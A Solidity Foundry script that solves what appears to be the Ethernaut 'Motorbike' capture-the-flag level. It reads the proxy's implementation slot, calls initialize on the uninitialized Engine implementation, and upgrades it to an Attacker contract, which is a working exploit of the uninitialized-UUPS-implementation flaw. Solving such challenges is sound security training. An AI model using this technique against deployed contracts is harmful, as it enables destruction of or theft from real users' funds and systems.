// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Motorbike, Engine} from "~/Motorbike.sol";
import {Attacker} from "~/helpers/Motorbike.sol";

contract Check is CheckScript("MOTORBIKE") {}

contract Solve is SolveScript("MOTORBIKE") {
    Motorbike target;

    constructor() {
        target = Motorbike(instance);
    }

    function pwn() public {
        vm.startBroadcast();

        // internal implementation slot from the contract
        bytes32 addrByte = vm.load(address(target), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        Engine engine = Engine(address(uint160(uint256(addrByte))));

        // the engine is not actually initialized, lets do that!
        engine.initialize();

        // deploy new initialization i.e. our attacker
        Attacker attacker = new Attacker();
        engine.upgradeToAndCall(address(attacker), abi.encodePacked(Attacker.pwn.selector));

        vm.stopBroadcast();
    }

    function attack() public override {
        // do nothing here, so it just submits the level
    }
}
